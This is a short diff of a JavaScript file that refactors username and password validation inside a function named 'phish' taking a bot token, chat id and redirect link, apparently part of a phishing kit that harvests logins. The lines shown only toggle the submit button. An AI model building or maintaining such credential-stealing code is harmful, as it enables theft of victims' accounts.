@@ -132,7 +132,7 @@ const phish = (bot_token, chat_id, redirect_link) => {
     $('#username, #password').on(
         'change input paste keydown cut keypress keyup changeproperty',
         function() {
-            $('#username').attr('valid') === 'true' &&
+            uname.attr('valid') === 'true' &&
             pass.attr('valid') === 'true'
                 ? submitButton.prop('disabled', false)
                 : submitButton.prop('disabled', true);
